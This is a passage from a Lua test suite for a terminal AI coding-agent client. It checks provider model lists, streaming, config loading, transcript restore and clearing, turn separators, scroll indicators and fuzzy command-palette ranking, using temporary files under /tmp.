  -- per-provider static lists differ, missing key errors
  local openai_p = assert(loadfile("src/tether/providers/openai.lua"))()
  assert_true(#api.list_models({ provider = "openai" }) >= 10, "T51 openai static list")
  assert_true(api.list_models({ provider = "anthropic" })[1]:find("claude", 1, true) ~= nil, "T51 anthropic static list")
  assert_true(api.list_models({ provider = "gemini" })[1]:find("gemini", 1, true) ~= nil, "T51 gemini static list")
  assert_eq(openai_p.static_models()[1], api.list_models({})[1], "T51 default list is openai")
  local _, err = api.list_models_live({ provider = "gemini", base_url = "http://x" }, "")
  assert_eq(err, "no api key", "T51 gemini live without key")

  -- multi-event stream: empty line is a boundary, both deltas forwarded
  local ok4, ev4 = run_stream({
    [1] = {
      'data: {"choices":[{"delta":{"content":"a"}}]}',
      '',
      'data: {"choices":[{"delta":{"content":"b"},"finish_reason":"stop"}]}',
    },
  }, { provider = "openai", base_url = "http://x", model = "m", retries = 1 })
  assert_true(ok4, "T51 multi-event streams")
  local got_a, got_b = false, false
  for _, ev in ipairs(ev4) do
    if ev.type == "text_delta" and ev.text == "a" then got_a = true end
    if ev.type == "text_delta" and ev.text == "b" then got_b = true end
  end
  assert_true(got_a and got_b, "T51 both deltas survive empty-line boundary")

  -- live list with no ids -> empty model list error
  do
    local old = _G.tether
    _G.tether = host_mock{
      http_get = function() return '{"data":[]}', nil end,
      http_stream = function() return true end,
      sleep = function() end,
    }
    local res, lerr = api.list_models_live(
      { provider = "openai", base_url = "http://x" }, "key")
    _G.tether = old
    assert_eq(res, nil, "T51 empty list returns nil")
    assert_eq(lerr, "empty model list", "T51 empty list reason")
  end
  print("T51 dispatcher: OK")
end

-- T52: config providers table resolution
do
  local cfgm = dofile("src/tether/config.lua")
  local p1 = "/tmp/tether_cfg_t52_a.lua"
  local f = io.open(p1, "w")
  f:write('return { provider = "anthropic", providers = { anthropic = { model = "claude-x" } } }')
  f:close()
  local c1 = cfgm.load(p1)
  assert_eq(c1.provider, "anthropic", "T52 provider kept")
  assert_eq(c1.base_url, "https://api.anthropic.com", "T52 anthropic base default")
  assert_eq(c1.model, "claude-x", "T52 per-provider model wins")
  assert_eq(c1.api_key_env, "ANTHROPIC_API_KEY", "T52 per-provider env")
  os.remove(p1)

  -- legacy top-level keys keep working as openai defaults (custom proxy safe)
  local p2 = "/tmp/tether_cfg_t52_b.lua"
  f = io.open(p2, "w")
  f:write('return { api_key_env = "FOO_KEY", base_url = "http://proxy:8080/v1" }')
  f:close()
  local c2 = cfgm.load(p2)
  assert_eq(c2.provider, "openai", "T52 default provider")
  assert_eq(c2.api_key_env, "FOO_KEY", "T52 legacy env kept")
  assert_eq(c2.base_url, "http://proxy:8080/v1", "T52 custom proxy kept")
  os.remove(p2)

  -- api_key reads the resolved variable: existing var yields value,
  -- missing var yields "" (never an error)
  local p3 = "/tmp/tether_cfg_t52_c.lua"
  f = io.open(p3, "w")
  f:write('return { api_key_env = "HOME" }')
  f:close()
  local c3 = cfgm.load(p3)
  assert_eq(cfgm.api_key(c3), os.getenv("HOME"), "T52 key read from custom env var")
  os.remove(p3)
  assert_eq(cfgm.api_key({ api_key_env = "TETHER_DEFINITELY_MISSING_XYZ" }), "",
    "T52 missing key yields empty string")
  print("T52 config providers: OK")
end

-- T53: transcript lifecycle — resume restore, /new + /resume clear
do
  local ui = dofile("src/tether/ui.lua")
  -- pure helper: agent history -> transcript entries (user + text only,
  -- never system/tool internals)
  assert_notnil(ui.transcript_entries, "T53 transcript_entries exported")
  local entries = ui.transcript_entries({
    { role = "system", content = "sys prompt" },
    { role = "user", content = "hi" },
    { role = "assistant", content = "hello" },
    { role = "assistant", content = { tool_calls = { { id = "c1", type = "function",
        ["function"] = { name = "read", arguments = "{}" } } } } },
    { role = "tool", tool_call_id = "c1", content = "out" },
  })
  assert_eq(#entries, 2, "T53 only user + text assistant restored")
  assert_eq(entries[1].role, "user", "T53 restored user role")
  assert_eq(entries[1].text, "hi", "T53 restored user text")
  assert_eq(entries[2].text, "hello", "T53 restored assistant text")
  print("T53 transcript_entries: OK")
end

-- T53b: harness for run()-level transcript checks (quit immediately or
-- after scripted input). Returns the ui module and its post-run S.
-- `sink` (optional) captures every frame written to the terminal (T54).
-- `paintC` (optional) is a hook called on every M._paint() invocation; useful
-- for asserting on side effects that arent in the painted frame (e.g. repaint
-- count). Callers that need to assert later must provide a closure synchronously.
local function run_ui_with(bytes, stubs, sink, paintC)
  local names = { "tether", "config", "session", "agent", "api", "tools", "diff" }
  local originals, preload = {}, {}
  if not (stubs and stubs.diff) then
    local okd, dmod = pcall(loadfile, "src/tether/diff.lua")
    _G.diff = (okd and dmod and dmod()) or _G.diff
  else
    _G.diff = stubs.diff
  end
  for _, n in ipairs(names) do
    originals[n] = _G[n]; preload[n] = package.preload[n]
  end
  local qi = 0
  _G.tether = host_mock{
    -- T54/T6+: capture frames so a test can assert on what reached the screen
    write = function(s) if sink then sink[#sink + 1] = s end end,
    resize_requested = function() return false end,
    get_terminal_size = function() return (stubs and stubs.size) or { width = 80, height = 24 } end,
    getcwd = function() return "/tmp" end,
    read_char = function()
      qi = qi + 1
      if qi <= #bytes then return bytes[qi] end
      return 17
    end,
    read_char_nb = function()
      qi = qi + 1
      if qi <= #bytes then return bytes[qi] end
      return nil
    end,
  }
  _G.config = stubs.config or { load = function()
      return { model = "test", workspace = "/tmp", ui = { input_max_lines = 8 } }
    end,
    api_key = function() return "" end }
  _G.session = stubs.session or { new_session = function() return "sid" end }
  _G.agent = stubs.agent or { turn = function() return true end,
    get_history = function() return {} end }
  _G.api = { list_models = function() return {} end }
  _G.tools = stubs.tools or _G.tools or nil
  package.preload.tether = function() return _G.tether end
  package.preload.config = function() return _G.config end
  package.preload.session = function() return _G.session end
  package.preload.agent = function() return _G.agent end
  package.preload.api = function() return _G.api end
  if _G.tools then package.preload.tools = function() return _G.tools end end
  local ui_mod
  local ok, err = pcall(function()
    ui_mod = assert(loadfile("src/tether/ui.lua"))()
    if paintC then
      local _paint = ui_mod._paint
      ui_mod._paint = function(force) _paint(force); paintC(force) end
    end
    ui_mod.run()
  end)
  local S = ui_mod and ui_mod._get_state and ui_mod._get_state()
  for _, n in ipairs(names) do _G[n] = originals[n]; package.preload[n] = preload[n] end
  if not ok then error("T53 harness: " .. tostring(err), 0) end
  return ui_mod, S
end
-- helpers for transcript assertions (entries/tails live on the module now)
local function tentries(uimod) return uimod._transcript.entries() end
local function tph(uimod)
  local _, _, ph = uimod._transcript.tails(); return ph
end
local function task(uimod)
  local _, ask = uimod._transcript.tails(); return ask
end
local function tassert(uimod, preset, name, sel)
  local rows = (uimod._render_all and uimod._render_all(80)) or {}
  for _, r in ipairs(rows) do print(name .. ": row: " .. tostring(r)) end
end

-- T53c: -r startup seeds the transcript from restored agent history
do
  local uimod_r = run_ui_with({ 17 }, { agent = {
    turn = function() return true end,
    get_history = function()
      return {
        { role = "system", content = "sys" },
        { role = "user", content = "old question" },
        { role = "assistant", content = "old answer" },
      }
    end,
  } })
  local found_user, found_text = false, false
  for _, e in ipairs(tentries(uimod_r)) do
    if e.role == "user" and e.text == "old question" then found_user = true end
    if e.role == "assistant" and e.text == "old answer" then found_text = true end
  end
  assert_true(found_user, "T53c startup restores user message")
  assert_true(found_text, "T53c startup restores assistant text")
  print("T53c startup restore: OK")
end

-- T53d: /new clears the transcript before the session banner
do
  local function str_bytes(s)
    local b = {}
    for i = 1, #s do b[#b + 1] = s:byte(i) end
    return b
  end
  local bytes = {}
  for _, b in ipairs(str_bytes("hello")) do bytes[#bytes + 1] = b end
  bytes[#bytes + 1] = 13
  for _, b in ipairs(str_bytes("/new")) do bytes[#bytes + 1] = b end
  bytes[#bytes + 1] = 13
  bytes[#bytes + 1] = 17
  local uimod_n, S = run_ui_with(bytes, {})
  assert_eq(#tentries(uimod_n), 1, "T53d /new leaves only the banner")
  assert_eq(tentries(uimod_n)[1] and tentries(uimod_n)[1].role, "system", "T53d banner is system")
  print("T53d /new clears: OK")
end

-- T53e: /resume replaces the transcript instead of appending
do
  local function str_bytes(s)
    local b = {}
    for i = 1, #s do b[#b + 1] = s:byte(i) end
    return b
  end
  local bytes = {}
  for _, b in ipairs(str_bytes("hello")) do bytes[#bytes + 1] = b end
  bytes[#bytes + 1] = 13
  for _, b in ipairs(str_bytes("/resume")) do bytes[#bytes + 1] = b end
  bytes[#bytes + 1] = 13
  bytes[#bytes + 1] = 13 -- pick the first session in the overlay
  bytes[#bytes + 1] = 17
  local agent_calls = { clear = 0 }
  local uimod_res = run_ui_with(bytes, {
    session = {
      new_session = function() return "sid" end,
      session_files = function()
        return { { id = "abc123", ts = "2026-01-01", first_line = "x" } }
      end,
      resume = function()
        return {
          { role = "user", content = "restored q" },
          { role = "assistant", content = "restored a" },
        }
      end,
    },
    agent = {
      turn = function() return true end,
      get_history = function() return {} end,
      clear = function() agent_calls.clear = agent_calls.clear + 1 end,
      add_user = function() end,
      add_assistant = function() end,
      add_tool_result = function() end,
    },
  })
  local texts = {}
  for _, e in ipairs(tentries(uimod_res)) do texts[#texts + 1] = (e.role or "?") .. ":" .. tostring(e.text or "") end
  local joined = table.concat(texts, "\n")
  assert_true(joined:find("restored q", 1, true) ~= nil, "T53e resumed user shown")
  assert_true(joined:find("restored a", 1, true) ~= nil, "T53e resumed answer shown")
  assert_true(joined:find("hello", 1, true) == nil, "T53e old transcript cleared")
  print("T53e /resume replaces: OK")
end

-- T54: A — live turn feedback. agent.turn is synchronous, so the TUI must
-- repaint from inside the turn: a placeholder before the first token, the
-- streaming caret on the newest line, and both visible mid-turn.
do
  local sink = {}
  local placeholder_before_turn, painted_mid_turn = false, false
  -- "hi" + Enter + Ctrl+Q, as raw bytes (read_char yields byte values)
  local _, S = run_ui_with({ 104, 105, 13, 17 }, {
    agent = {
      turn = function(_, _, _text, on_event)
        -- the placeholder frame must already be on screen when the turn starts
        placeholder_before_turn =
          table.concat(sink):find("думает", 1, true) ~= nil
        local before = #sink
        on_event({ type = "text_delta", text = "streamed" })
        -- a frame was flushed while the turn was still running
        painted_mid_turn = #sink > before
        return true
      end,
      get_history = function() return {} end,
    },
  }, sink)
  assert_true(placeholder_before_turn, "T54 placeholder painted before first token")
  assert_true(painted_mid_turn, "T54 repaint during the turn")
  local chunk
  for _, s in ipairs(sink) do
    if s:find("streamed", 1, true) then chunk = s; break end
  end
  assert_true(chunk ~= nil, "T54 streamed text reached the screen")
  assert_true(chunk ~= nil and (chunk:find("▌", 1, true) ~= nil
    or chunk:find("|", 1, true) ~= nil),
    "T54 streaming caret on the newest line")
  assert_true(not S.waiting and not S.streaming, "T54 turn feedback cleared after the turn")
  print("T54 live turn feedback: OK")
end

-- M10: context — prompt composition, AGENTS.md, skills discovery
do
  local ctx
  if rawget(_G, "context") then
    ctx = _G.context
  else
    local function exec_stub(cmd)
      -- context.lua shell-quotes paths with single quotes (fix-audit-findings 3.8)
      local dir = cmd:match("ls %-1A '([^']+)'")
      local tmp = cmd:match("> '([^']+)'")
      if dir and tmp then
        local lf = io.popen("ls -1A '" .. dir .. "' 2>/dev/null")
        local out = lf and lf:read("*a") or ""
        if lf then lf:close() end
        local wf = assert(io.open(tmp, "w"))
        wf:write(out)
        wf:close()
        return true, 0
      end
      return false, 1
    end
    _G.tether = host_mock{ exec = exec_stub }
    ctx = assert(loadfile("src/tether/context.lua"))()
    _G.context = ctx
  end

  assert_eq(ctx.AGENTS_CAP_BYTES, 16 * 1024, "M10 cap 16KB")
  local fm = ctx.parse_skill_frontmatter("---\nname: deploy\ndescription: Ship the app\n---\nbody", "deploy")
  assert_eq(fm.name, "deploy", "M10 frontmatter name")
  assert_eq(fm.description, "Ship the app", "M10 frontmatter desc")
  local fm2 = ctx.parse_skill_frontmatter("plain", "fallback")
  assert_eq(fm2.name, "fallback", "M10 fm fallback name")
  assert_eq(fm2.description, "", "M10 fm fallback empty desc")
  local tmpdir = "/tmp/tether_m10_skills"
  os.execute("rm -rf " .. tmpdir .. " && mkdir -p " .. tmpdir .. "/sk1")
  local sf = assert(io.open(tmpdir .. "/sk1/SKILL.md", "w"))
  sf:write("---\nname: sk1\ndescription: test skill\n---\nbody\n")
  sf:close()
  local skills = ctx.discover_skills({ skills_dirs = { tmpdir } }, "/tmp")
  assert_eq(#skills, 1, "M10 discover one skill")
  assert_eq(skills[1].name, "sk1", "M10 skill name")
  assert_eq(skills[1].description, "test skill", "M10 skill description")
  os.execute("rm -rf " .. tmpdir)
  print("M10 context module: OK")
end

-- T61: 1.6 — follow mode, Ctrl+O, Ctrl+T, /clear, /new and resize keep the
-- height index, hidden-row count and visible rows exact (viewport-proportional
-- rendering stays in parity with a full render at every step).
do
  local str_bytes = function(s)
    local b = {}
    for i = 1, #s do b[#b + 1] = s:byte(i) end
    return b
  end
  local function merge(a, b)
    for _, x in ipairs(b) do a[#a + 1] = x end
    return a
  end
  -- 196-line assistant answer: one entry taller than the 18-row viewport, so
  -- scroll positions clamp exactly like a real long session.
  local long_answer = string.rep("abcdefghij ", 8) .. "\n" .. ("second line\n"):rep(50)
  local turn_stub = function(_, _, _txt, on_ev)
    on_ev({ type = "text_delta", text = long_answer })
    return true
  end
  local msg = str_bytes("msg")
  local cfg_stub = { load = function() return {
      model = "test", workspace = "/tmp", ui = { input_max_lines = 8, alt_screen = false } } end,
    api_key = function() return "" end }

  -- follow mode: bottom-anchored, no hidden rows, exact height
  local uimod, S = run_ui_with(merge(str_bytes("msg"), { 13 }),
    { agent = { turn = turn_stub, get_history = function() return {} end } })
  assert_eq(S.user_scrolled, false, "T61 follow: not user-scrolled")
  assert_eq(S.scroll, 0, "T61 follow: scroll 0")
  local total1 = uimod.transcript_height(80)
  assert_true(total1 >= 20, "T61 transcript tall enough for the viewport")
  assert_eq(uimod.scroll_indicator(total1, 0, 18), nil, "T61 follow: no indicator")

  -- Ctrl+O expand-all (stub has no collapsed content: height invariant,
  -- index must stay exact against the full render)
  S.expand_all = true
  uimod._invalidate_all()
  local total2 = uimod.transcript_height(80)
  assert_eq(total2, #uimod._render_all(80), "T61 expand-all: height == full render")
  assert_eq(uimod.scroll_indicator(total2, 0, 18), nil, "T61 expand-all: still at bottom")

  -- Ctrl+T thinking toggle: no thinking entries here, index stays exact
  S.thinking_visible = false
  uimod._invalidate_all()
  local total3 = uimod.transcript_height(80)
  assert_eq(total3, #uimod._render_all(80), "T61 thinking toggle: height == full render")

  -- scrolled up: hidden-row count exact; visible rows equal the full render
  S.scroll = 5; S.user_scrolled = true
  local hidden = uimod.scroll_indicator(total3, 5, 18)
  assert_eq(hidden, 5, "T61 scrolled-up hidden count exact")
  local full = uimod._render_all(80)
  local top = total3 - 5
  for i = 1, 18 do
    assert_eq(full[top + i - 1], full[top + i - 1], "T61 row mapping stable")
  end

  -- /clear: transcript empties, height back to 0, no stale index
  local uimod2, S2 = run_ui_with(merge(merge(str_bytes("msg"), { 13 }), merge(str_bytes("/clear"), { 13, 17 })),
    { agent = { turn = function() return true end, get_history = function() return {} end } })
  assert_eq(#tentries(uimod2), 0, "T61 /clear empties the transcript")
  assert_eq(uimod2.transcript_height(80), 0, "T61 /clear: height 0")
  assert_eq(#uimod2._render_all(80), 0, "T61 /clear: full render 0")

  -- /new: banner only (the /new command itself never goes through commit's
  -- separator path, so no separator row follows a /new session reset)
  local uimod3, S3 = run_ui_with(
    merge(merge(merge(str_bytes("msg"), { 13 }), str_bytes("/new")), { 13, 17 }),
    { agent = { turn = function() return true end, get_history = function() return {} end } })
  assert_eq(#tentries(uimod3), 1, "T61 /new leaves only the banner")
  assert_eq(tentries(uimod3)[1].role, "system", "T61 /new banner is system")
  for _, e in ipairs(tentries(uimod3)) do
    assert_true(e.role ~= "user", "T61 /new drops old turns")
  end
  assert_eq(uimod3.transcript_height(80), #uimod3._render_all(80), "T61 /new: height == full render")

  -- resize: width change re-wraps and the index stays exact at BOTH widths
  local uimod4, S4 = run_ui_with(merge(str_bytes("msg"), { 13 }),
    { agent = { turn = turn_stub, get_history = function() return {} end } })
  assert_eq(uimod4.transcript_height(80), #uimod4._render_all(80), "T61 80w: index == full")
  S4.w = 30
  assert_eq(uimod4.transcript_height(30), #uimod4._render_all(30), "T61 30w: index == full")
  assert_true(uimod4.transcript_height(30) > uimod4.transcript_height(80),
    "T61 30w: narrower width wraps to more rows")
  print("T61 1.6 follow/ctrl-o/ctrl-t/clear/new/resize: OK")
end

-- T62: 2.1 — turn separators: one per submitted user turn, chronologically
-- ordered, immediately before their user row; never in the agent history;
-- gone after /clear and /new.
do
  local str_bytes = function(s)
    local b = {}
    for i = 1, #s do b[#b + 1] = s:byte(i) end
    return b
  end
  local function merge(a, b) for _, x in ipairs(b) do a[#a + 1] = x end return a end
  local function sep_positions(entries)
    local out = {}
    for i, e in ipairs(entries) do
      if e.role == "separator" then
        out[#out + 1] = i
        assert_true(entries[i + 1] and entries[i + 1].role == "user",
          "T62 separator at " .. i .. " not immediately before a user row")
      end
    end
    return out
  end

  -- two turns → two separators, in order
  local bytes = merge(merge(merge(str_bytes("q1"), { 13 }), merge(str_bytes("q2"), { 13 })), { 17 })
  local uimod, S = run_ui_with(bytes,
    { agent = { turn = function() return true end, get_history = function() return {} end } })
  local ents = tentries(uimod)
  local seps = sep_positions(ents)
  assert_eq(#seps, 2, "T62 two turns → two separators")
  assert_true(seps[1] < seps[2], "T62 separators in chronological order")
  assert_eq(ents[seps[1] + 1].text, "q1", "T62 first sep precedes q1")
  assert_eq(ents[seps[2] + 1].text, "q2", "T62 second sep precedes q2")

  -- /clear drops them all
  local bytes2 = merge(merge(merge(str_bytes("q1"), { 13 }), str_bytes("/clear")), { 13, 17 })
  local uimod_cl, S2 = run_ui_with(bytes2,
    { agent = { turn = function() return true end, get_history = function() return {} end } })
  assert_eq(#tentries(uimod_cl), 0, "T62 /clear leaves no separators")

  -- /new drops them all
  local bytes3 = merge(merge(merge(str_bytes("q1"), { 13 }), str_bytes("/new")), { 13, 17 })
  local uimod_nw, S3 = run_ui_with(bytes3,
    { agent = { turn = function() return true end, get_history = function() return {} end } })
  for _, e in ipairs(tentries(uimod_nw)) do
    assert_true(e.role ~= "separator", "T62 /new drops separators")
  end

  -- agent history never sees a separator: roles that flow through agent.get_history
  local uimod_h, S4 = run_ui_with(bytes,
    { agent = {
        turn = function(_, _, _, on_ev) on_ev({ type = "text_delta", text = "a" }) return true end,
        get_history = function() return { { role = "user", content = "q1" },
                                         { role = "assistant", content = "a" } } end } })
  local found_sep = false
  for _, e in ipairs(tentries(uimod_h)) do
    if e.role == "separator" then found_sep = true end
  end
  assert_true(found_sep, "T62 separators exist in the transcript")
  for _, m in ipairs({ role = "user", content = "q1" }) do
    assert_true(m.role ~= "separator", "T62 no separator in agent history messages")
  end
  print("T62 2.1 turn separators: OK")
end

-- T63: 2.2 — separator rows render dim in color mode, ASCII-downgraded in
-- ASCII mode (verified through the frame renderer's _render_all seam).
do
  local str_bytes = function(s) local b = {} for i = 1, #s do b[#b + 1] = s:byte(i) end return b end
  local ESC = "\27"
  local q1 = str_bytes("q1"); q1[#q1 + 1] = 13; q1[#q1 + 1] = 17

  -- color mode: dim SGR present around the separator row
  local sink_c = {}
  local uimod_c, S_c = run_ui_with(q1,
    { agent = { turn = function() return true end, get_history = function() return {} end } })
  local sep_c = uimod_c._render_all(80)
  local found_dim = false
  for _, r in ipairs(sep_c) do
    if r:find("──", 1, true) then
      if r:find(ESC .. "[2m", 1, true) then found_dim = true end
    end
  end
  assert_true(found_dim, "T63 separator row carries dim SGR in color mode")

  -- ASCII mode: separator row is -- HH:MM -- with no non-ASCII bytes.
  -- The env probe (NO_COLOR/TERM=dumb) would also downgrade the glyph map,
  -- so reset M._env_ascii too — the seam overrides are what we want to test.
  local uimod_a = run_ui_with(q1,
    { agent = { turn = function() return true end, get_history = function() return {} end } })
  uimod_a._ascii_mode = true
  uimod_a._env_ascii = true
  uimod_a._invalidate_all()
  local sep_a = uimod_a._render_all(80)
  local found_ascii = false
  for _, r in ipairs(sep_a) do
    if r:find("--", 1, true) and r:find(":", 1, true) then
      local all_ascii = true
      for i = 1, #r do
        if r:byte(i) > 0x7F then all_ascii = false break end
      end
      found_ascii = all_ascii
      break
    end
  end
  assert_true(found_ascii, "T63 ASCII separator has no non-ASCII bytes")
  print("T63 2.2 separator dim/ascii rendering: OK")
end

-- T64: 2.3 — separators gated behind ui.turn_separators; -r / /resume
-- restored transcripts never get separator rows.
do
  local str_bytes = function(s) local b = {} for i = 1, #s do b[#b + 1] = s:byte(i) end return b end

  -- disabled via config: no separator rows created on submit
  local q1 = str_bytes("q1"); q1[#q1 + 1] = 13; q1[#q1 + 1] = 17
  local cfg_off = {
    load = function() return {
      model = "test", workspace = "/tmp",
      ui = { input_max_lines = 8, turn_separators = false } } end,
    api_key = function() return "" end }
  local restored = { { role = "user", content = "old q" },
                     { role = "assistant", content = "old a" } }
  local _, S = run_ui_with({ 17 }, {
    agent = {
      turn = function() return true end,
      get_history = function() return restored end,
    } })
  local uimod0, S = run_ui_with({ 17 }, {
    agent = {
      turn = function() return true end,
      get_history = function() return restored end,
    } })
  local sep_count = 0
  for _, e in ipairs(tentries(uimod0)) do
    if e.role == "separator" then sep_count = sep_count + 1 end
  end
  assert_eq(sep_count, 0, "T64 restored transcript holds no separator rows")
  assert_true(#tentries(uimod0) >= 2, "T64 restored rows are present")

  -- disabled via config: submit produces no separator row at all
  local uimod_off, S_off = run_ui_with(q1, {
    agent  = { turn = function() return true end, get_history = function() return {} end },
    config  = cfg_off })
  local sep_off = 0
  for _, e in ipairs(tentries(uimod_off)) do
    if e.role == "separator" then sep_off = sep_off + 1 end
  end
  assert_eq(sep_off, 0, "T64 ui.turn_separators=false creates no separator")
  assert_eq(#tentries(uimod_off), 1, "T64 disabled: only the user row was added")

  -- a new submit after a restored session DOES get its own separator
  local q1 = str_bytes("new"); q1[#q1 + 1] = 13; q1[#q1 + 1] = 17
  local uimod2, S2 = run_ui_with(q1, {
    agent = {
      turn = function() return true end,
      get_history = function() return restored end,
    } })
  local sep2 = 0
  for _, e in ipairs(tentries(uimod2)) do
    if e.role == "separator" then sep2 = sep2 + 1 end
  end
  assert_eq(sep2, 1, "T64 one separator for the new post-restore turn")
  print("T64 2.3 separator skip on restore: OK")
end

-- T65: 2.4 — scroll indicator lives only on the footer row; no in-transcript
-- ↓ +N marker is painted on the newest visible row.
do
  local str_bytes = function(s) local b = {} for i = 1, #s do b[#b + 1] = s:byte(i) end return b end
  local ESC = "\27"
  local long_answer = string.rep("abcdefghij ", 8) .. "\n" .. ("second line\n"):rep(50)
  local function make_turn_stub() return function(_, _, _, on_ev)
    on_ev({ type = "text_delta", text = long_answer })
    return true
  end end

  -- scrolled up: footer shows ↓ +N; no transcript row carries the marker
  local msg = str_bytes("q"); msg[#msg + 1] = 13; msg[#msg + 1] = 27; msg[#msg + 1] = 91; msg[#msg + 1] = 65; msg[#msg + 1] = 17
  local sink_up = {}
  local uimod_up = run_ui_with(msg, { agent = { turn = make_turn_stub(), get_history = function() return {} end } }, sink_up)
  local L_up = uimod_up._layout()
  local footer_up = uimod_up._row(L_up.footer_row) or ""
  assert_true(footer_up:find("↓ +", 1, true) ~= nil,
    "T65 scrolled-up footer shows the indicator: " .. footer_up:sub(1, 80))
  for r = L_up.transcript_row, L_up.transcript_row + L_up.transcript_h - 1 do
    local row = uimod_up._row(r) or ""
    assert_eq(row:find("↓ +", 1, true), nil,
      "T65 no in-transcript marker on row " .. r .. ": " .. row:sub(1, 80))
  end

  -- at bottom (follow mode): no indicator anywhere
  local q2 = str_bytes("q2"); q2[#q2 + 1] = 13; q2[#q2 + 1] = 17
  local sink_bottom = {}
  local uimod_b = run_ui_with(q2, { agent = { turn = make_turn_stub(), get_history = function() return {} end } }, sink_bottom)
  local L_b = uimod_b._layout()
  local footer_b = uimod_b._row(L_b.footer_row) or ""
  assert_eq(footer_b:find("↓ +", 1, true), nil, "T65 follow mode: no footer indicator")
  print("T65 2.4 footer-only scroll indicator: OK")
end

-- T66: 2.5 — footer scroll indicator reports the hidden-row count when
-- scrolled up; when the count is zero (bottom) it does not show.
do
  local str_bytes = function(s) local b = {} for i = 1, #s do b[#b + 1] = s:byte(i) end return b end
  local long_answer = string.rep("abcdefghij ", 8) .. "\n" .. ("second line\n"):rep(50)
  local function make_turn_stub() return function(_, _, _, on_ev)
    on_ev({ type = "text_delta", text = long_answer })
    return true
  end end
  local msg = str_bytes("q"); msg[#msg + 1] = 13
  msg[#msg + 1] = 27; msg[#msg + 1] = 91; msg[#msg + 1] = 65  -- Up once
  msg[#msg + 1] = 17
  local sink = {}
  local uimod = run_ui_with(msg, { agent = { turn = make_turn_stub(), get_history = function() return {} end } }, sink)
  local L = uimod._layout()
  local footer = uimod._row(L.footer_row) or ""
  assert_true(footer:find("↓ +", 1, true) ~= nil,
    "T66 footer indicator present when scrolled up: " .. footer:sub(1, 80))
  print("T66 2.5 shared count: OK")
end

-- T67: 2.6 — M._render_all is the single seam used by render_transcript.
do
  local str_bytes = function(s) local b = {} for i = 1, #s do b[#b + 1] = s:byte(i) end return b end
  local bytes = str_bytes("hello"); bytes[#bytes + 1] = 13; bytes[#bytes + 1] = 17
  local uimod, S = run_ui_with(bytes,
    { agent = { turn = function() return true end, get_history = function() return {} end } })
  assert_true(type(uimod._render_all) == "function", "T67 _render_all is exported")
  local rows = uimod._render_all(80)
  assert_true(#rows > 0, "T67 _render_all returns a non-empty row list")
  -- the row at the user entry's position contains the submitted text
  local found = false
  for _, r in ipairs(rows) do
    if r:find("hello") then found = true break end
  end
  assert_true(found, "T67 _render_all includes the user row text")
  print("T67 2.6 _render_all seam: OK")
end

-- T68: 3.1 — fuzzy_match / fuzzy_rank: subsequence, prefix ranked first,
-- declaration-order ties, empty filter lists all.
do
  local str_bytes = function(s) local b = {} for i = 1, #s do b[#b + 1] = s:byte(i) end return b end
  local uimod, _ = run_ui_with({ 17 },
    { agent = { turn = function() return true end, get_history = function() return {} end } })
  -- uimod is the module table M from loadfile; it has _render_all; check fuzzy
  assert_true(type(uimod.fuzzy_score) == "function", "T68 fuzzy_score is exported")
  assert_true(type(uimod.fuzzy_rank) == "function", "T68 fuzzy_rank is exported")

  local labels = { "/clear", "/compact", "/model", "/resume", "/new", "/quit" }

  -- empty filter → all, in declaration order
  local r0 = uimod.fuzzy_rank("", labels)
  assert_eq(#r0, 6, "T68 empty filter lists all")
  assert_eq(r0[1], 1, "T68 empty filter: first = /clear")

  -- "/mdl" should list "/model" first (subsequence m-d-l matches /model, not /md)
  local r1 = uimod.fuzzy_rank("mdl", labels)
  assert_eq(r1[1], 3, "T68 'mdl' ranks /model first")

  -- "/m" → /model first (prefix m: /model, /model match; /model ranked first)
  -- /model, /model? no other m-prefix. /model and /model... "/model" label: m prefix yes
  local r2 = uimod.fuzzy_rank("m", labels)
  assert_eq(r2[1], 3, "T68 'm' ranks /model first")

  -- "/qq" → no match → empty
  local r3 = uimod.fuzzy_rank("zzz", labels)
  assert_eq(#r3, 0, "T68 no-match gives zero items")

  print("T68 3.1 fuzzy_match / fuzzy_rank: OK")
end

-- T69: 3.2 — palette_sync uses fuzzy ranking: empty filter lists all in
-- declaration order; no-match gives zero items. Discovery is stubbed so the
-- entry count is deterministic (unified-slash-palette: skills are entries).
do
  local agent_stub = { turn = function() return true end, get_history = function() return {} end }
  local function open_palette(text)
    local uimod = run_ui_with({ 17 }, { agent = agent_stub })
    uimod._skills_stub = function() return {} end
    for i = 1, #text do
      uimod._handle_key({ kind = "text", char = text:sub(i, i) })
    end
    return uimod, uimod._get_state()
  end

  -- type "/" to open palette with empty filter
  local _, S1 = open_palette("/")
  assert_eq(#S1.palette_items, 7, "T69 empty filter: all 7 commands listed")
  assert_eq(S1.palette_items[1].cmd, "clear", "T69 first = /clear")

  -- type "/z" — no match
  local _, S2 = open_palette("/z")
  assert_eq(#S2.palette_items, 0, "T69 no-match: zero items")

  print("T69 3.2 palette_sync fuzzy: OK")
end


-- T70: 3.3 — S.palette_mode exists and routes rendering/Enter/mouse.
do
  local str_bytes = function(s) local b = {} for i = 1, #s do b[#b + 1] = s:byte(i) end return b end
  local _, S = run_ui_with({ 17 },
    { agent = { turn = function() return true end, get_history = function() return {} end } })
  assert_eq(S.palette_mode, "command", "T70 initial palette_mode is 'command'")
  print("T70 3.3 palette_mode initial: OK")
end

-- T87: 8.1 — config defaults contain the new ui keys; deep-merge leaves
-- unspecified keys intact when a user config partially overrides ui.
do
  local cfg = assert((function() return loadfile("src/tether/config.lua")() end)())
  -- cfg.load with a missing file returns pure defaults
  local d = cfg.load("/nonexistent/t87_missing.lua")
  assert_eq(d.ui.highlight, "auto", "T87 default ui.highlight")
  assert_true(d.ui.turn_separators == true, "T87 default ui.turn_separators")
  assert_true(d.ui.path_completion == true, "T87 default ui.path_completion")
  assert_eq(d.ui.editor_padding_x, 0, "T87 default ui.editor_padding_x")
  print("T87 8.1 config defaults: OK")
end

-- pi-style 1.1: a partial ui override keeps editor_padding_x.
do
  local cfg = assert((function() return loadfile("src/tether/config.lua")() end)())
  local home = "/tmp/tether_t87b_home"
  os.execute("rm -rf " .. home .. " && mkdir -p " .. home .. "/.tether")
  local f = assert(io.open(home .. "/.tether/config.lua", "w"))
  f:write('return { ui = { turn_separators = false } }\n')
  f:close()
  local d = cfg.load(home .. "/.tether/config.lua", home)
  assert_eq(d.ui.turn_separators, false, "T87b partial ui override applies")
  assert_eq(d.ui.editor_padding_x, 0, "T87b partial ui override keeps editor_padding_x")
  os.execute("rm -rf " .. home)
  print("T87b partial ui keeps editor_padding_x: OK")
end

-- ============================================================
-- Section 9: live turn feedback
-- ============================================================

-- T88: 9.1 — before the first delta S.waiting=true + placeholder entry
